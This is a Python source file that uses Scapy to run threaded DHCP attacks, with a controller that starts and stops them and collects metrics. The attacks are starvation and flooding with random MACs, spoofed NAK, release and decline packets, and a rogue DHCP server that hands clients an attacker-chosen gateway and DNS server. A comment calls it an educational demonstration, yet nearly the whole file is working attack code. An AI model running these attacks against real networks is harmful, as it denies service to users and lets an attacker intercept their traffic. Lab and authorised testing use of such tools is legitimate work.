
import threading
import time
import random
import logging
from scapy.all import Ether, IP, UDP, BOOTP, DHCP, sendp, srp1, conf, get_if_hwaddr, sniff
from scapy.volatile import RandMAC

# Configure Scapy to not be too verbose
conf.verb = 0

class AttackManager:
    def __init__(self):
        self.active_attacks = {}
        self.lock = threading.Lock()
        self.metrics = {}  # {type: {'sent': 0, 'errors': 0}}
        self.logs = []     # List of strings/dicts
        self.log_lock = threading.Lock()
    
    def _log(self, attack_type, message):
        """Append a log message safely."""
        with self.log_lock:
            timestamp = time.strftime("%H:%M:%S")
            self.logs.append({"time": timestamp, "type": attack_type, "msg": message})
            if len(self.logs) > 100:  # Keep last 100 logs
                self.logs.pop(0)

    def _inc_metric(self, attack_type, key='sent'):
        """Increment a metric safely."""
        with self.lock:
            if attack_type not in self.metrics:
                self.metrics[attack_type] = {'sent': 0, 'errors': 0}
            self.metrics[attack_type][key] += 1
        
    def _get_mac(self, iface):
        try:
            return get_if_hwaddr(iface)
        except:
            return "00:00:00:00:00:00"

    def start_attack(self, attack_type, iface, target_ip=None, **kwargs):
        with self.lock:
            if attack_type in self.active_attacks:
                return False, "Attack already running"
            
            stop_event = threading.Event()
            
            if attack_type == 'starvation':
                target = self._attack_starvation
            elif attack_type == 'nak':
                target = self._attack_nak
            elif attack_type == 'release':
                target = self._attack_release
            elif attack_type == 'flood':
                target = self._attack_flood
            elif attack_type == 'decline':
                target = self._attack_decline
            elif attack_type == 'decline':
                target = self._attack_decline
            elif attack_type == 'rogue_server':
                target = self._attack_rogue
            else:
                return False, "Unknown attack type"
            
            thread = threading.Thread(
                target=target,
                args=(iface, target_ip, stop_event),
                kwargs=kwargs,
                daemon=True
            )
            thread.start()
            
            self.active_attacks[attack_type] = {
                'thread': thread,
                'stop_event': stop_event
            }
            # Initialize metrics for this run
            with self.lock:
                self.metrics[attack_type] = {'sent': 0, 'errors': 0}
                
            self._log("System", f"Attack '{attack_type}' started on {iface}")
            return True, f"Started {attack_type}"

    def stop_attack(self, attack_type):
        with self.lock:
            if attack_type not in self.active_attacks:
                return False, "Attack not running"
            
            self.active_attacks[attack_type]['stop_event'].set()
            # We don't join here to avoid blocking, let it finish gracefully or check is_alive later
            del self.active_attacks[attack_type]
            self._log("System", f"Attack '{attack_type}' stopped")
            return True, f"Stopped {attack_type}"

    def get_status(self):
        with self.lock:
            status = {}
            for k, v in self.active_attacks.items():
                status[k] = {
                    'running': v['thread'].is_alive(),
                    'metrics': self.metrics.get(k, {'sent': 0, 'errors': 0})
                }
            
            # Also return recent logs
            with self.log_lock:
                current_logs = list(self.logs) # copy
                
            return {'attacks': status, 'logs': current_logs}

    # --- Attack Implementations ---

    def _attack_starvation(self, iface, target_ip, stop_event):
        """DHCP Starvation: Consume all available IPs by requesting with random MACs."""
        while not stop_event.is_set():
            mac = str(RandMAC())
            pkt = Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") / \
                  IP(src="0.0.0.0", dst="255.255.255.255") / \
                  UDP(sport=68, dport=67) / \
                  BOOTP(chaddr=mac_str_to_bytes(mac)) / \
                  DHCP(options=[("message-type", "discover"), "end"])
            
            sendp(pkt, iface=iface, verbose=False)
            self._inc_metric('starvation')
            if random.random() < 0.05: # Log occasionally to avoid spam
                self._log('starvation', f"Sent DISCOVER from {mac}")
            time.sleep(0.1) # Simulate slight delay or go full speed

    def _attack_nak(self, iface, target_ip, stop_event):
        """DHCP NAK: Send NAKs to a target IP to force them to release/renew."""
        if not target_ip:
            return 
            
        server_id = "192.168.1.1" # Dummy, ideally we find the real server
        # For NAK, we spoof the server. 
        
        while not stop_event.is_set():
            # This is a blind NAK attack. Ideally we sniff for REQUESTS and NAK them.
            # Here we just spam NAKs for educational demonstration.
            pkt = IP(src=server_id, dst=target_ip) / \
                  UDP(sport=67, dport=68) / \
                  BOOTP(op=2) / \
                  DHCP(options=[("message-type", "nak"), ("server_id", server_id), "end"])
            
            # Note: sending via L3/L2 wrapper might vary based on local network
            sendp(Ether()/pkt, iface=iface, verbose=False)
            time.sleep(0.5)

    def _attack_release(self, iface, target_ip, stop_event):
        """DHCP Release: Spoof the client releasing their IP."""
        if not target_ip:
            return

        # We assume we know the target MAC or we just randomization source if server doesn't check
        # Real attack requires knowing Client MAC + Server ID. 
        # For demo, we try to guess or use random.
        
        server_id = "192.168.1.1" # Placeholder
        
        while not stop_event.is_set():
            client_mac = str(RandMAC()) # Ideally this should be TARGET MAC
            pkt = Ether(src=client_mac, dst="ff:ff:ff:ff:ff:ff") / \
                  IP(src=target_ip, dst=server_id) / \
                  UDP(sport=68, dport=67) / \
                  BOOTP(ciaddr=target_ip, chaddr=mac_str_to_bytes(client_mac)) / \
                  DHCP(options=[("message-type", "release"), ("server_id", server_id), "end"])
            
            sendp(pkt, iface=iface, verbose=False)
            time.sleep(1)

    def _attack_flood(self, iface, target_ip, stop_event):
        """DHCP Discover Flood: High frequency packets."""
        while not stop_event.is_set():
            mac = str(RandMAC())
            pkt = Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") / \
                  IP(src="0.0.0.0", dst="255.255.255.255") / \
                  UDP(sport=68, dport=67) / \
                  BOOTP(chaddr=mac_str_to_bytes(mac)) / \
                  DHCP(options=[("message-type", "discover"), "end"])
            
            sendp(pkt, iface=iface, verbose=False)
            # No sleep for flood

    def _attack_decline(self, iface, target_ip, stop_event):
        """DHCP Decline: Claim an IP is in use."""
        if not target_ip:
            target_ip = "10.0.0.5" # Default if not set

        while not stop_event.is_set():
             # Spoof a client declining an IP
            mac = str(RandMAC())
            pkt = Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") / \
                  IP(src="0.0.0.0", dst="255.255.255.255") / \
                  UDP(sport=68, dport=67) / \
                  BOOTP(chaddr=mac_str_to_bytes(mac)) / \
                  DHCP(options=[("message-type", "decline"), ("requested_addr", target_ip), "end"])
            
            sendp(pkt, iface=iface, verbose=False)
            self._inc_metric('decline')
            self._log('decline', f"Sent DECLINE for {target_ip} as {mac}")
            time.sleep(0.2)
            
    def _attack_rogue(self, iface, target_ip, stop_event, **kwargs):
        """Rogue DHCP Server: Listens for DISCOVER and replies with OFFER."""
        # This is a very basic implementation. Ideally uses a proper sniffer callback.
        # kwargs might contain 'rogue_ip', 'utils', 'dns' etc. 
        rogue_server_ip = kwargs.get('rogue_server_ip', "192.168.1.66")
        offered_gateway = kwargs.get('rogue_gateway', "192.168.1.66")
        offered_dns = kwargs.get('rogue_dns', "8.8.8.8")
        
        # We need a socket to listen for DISCOVER packets.
        # Scapy's sniff is blocking, so we use it with a timeout loop or callback inside the thread.
        
        self._log('rogue_server', f"Started Rogue Server at {rogue_server_ip}")

        def handle_pkt(pkt):
            if DHCP in pkt and pkt[DHCP].options[0][1] == 1: # DISCOVER
                # Client mac
                client_mac = pkt[Ether].src
                xid = pkt[BOOTP].xid
                
                # Craft OFFER
                # We simply offer a fixed IP loop or random from pool for this demo
                offered_ip = "192.168.1.100" 
                
                self._log('rogue_server', f"Received DISCOVER from {client_mac}, Offering {offered_ip}")
                
                # Reply
                # Ether src = Interace MAC (we should get it)
                my_mac = get_if_hwaddr(iface)
                
                resp = Ether(src=my_mac, dst=client_mac) / \
                       IP(src=rogue_server_ip, dst="255.255.255.255") / \
                       UDP(sport=67, dport=68) / \
                       BOOTP(op=2, yiaddr=offered_ip, siaddr=rogue_server_ip, chaddr=pkt[BOOTP].chaddr, xid=xid) / \
                       DHCP(options=[
                           ("message-type", "offer"),
                           ("server_id", rogue_server_ip),
                           ("lease_time", 43200),
                           ("router", offered_gateway),
                           ("name_server", offered_dns),
                           "end"
                       ])
                       
                sendp(resp, iface=iface, verbose=False)
                self._inc_metric('rogue_server')

        # Sniff loop
        while not stop_event.is_set():
             # Sniff 1 packet at a time with short timeout to check stop_event
             try:
                 # filter="udp and (port 67 or 68)"
                 # We assume raw socket availability
                 sniff(iface=iface, filter="udp and port 67", prn=handle_pkt, count=1, timeout=1, store=0)
             except Exception as e:
                 self._log('rogue_server', f"Sniff Error: {str(e)}")
                 time.sleep(1)

    def run_recon(self, iface):
        """Simple Recon: Send a Discover and see who offers."""
        mac = str(RandMAC())
        pkt = Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") / \
              IP(src="0.0.0.0", dst="255.255.255.255") / \
              UDP(sport=68, dport=67) / \
              BOOTP(chaddr=mac_str_to_bytes(mac)) / \
              DHCP(options=[("message-type", "discover"), "end"])
        
        # Open socket to listen first
        # ans = srp1(pkt, iface=iface, timeout=2, verbose=0)
        # This is blocking, might be better to just send and have a sniffer thread, 
        # but for simple recon srp1 is okay if short timeout.
        try:
             ans = srp1(pkt, iface=iface, timeout=3, verbose=0)
             if ans:
                 return {
                     "server_mac": ans[Ether].src,
                     "server_ip": ans[IP].src,
                     "offered_ip": ans[BOOTP].yiaddr
                 }
        except Exception as e:
            return {"error": str(e)}
        
        return {"result": "No DHCP Server found or timed out"}


def mac_str_to_bytes(mac_str):
    return bytes.fromhex(mac_str.replace(':', ''))

# Global instance
attack_manager = AttackManager()
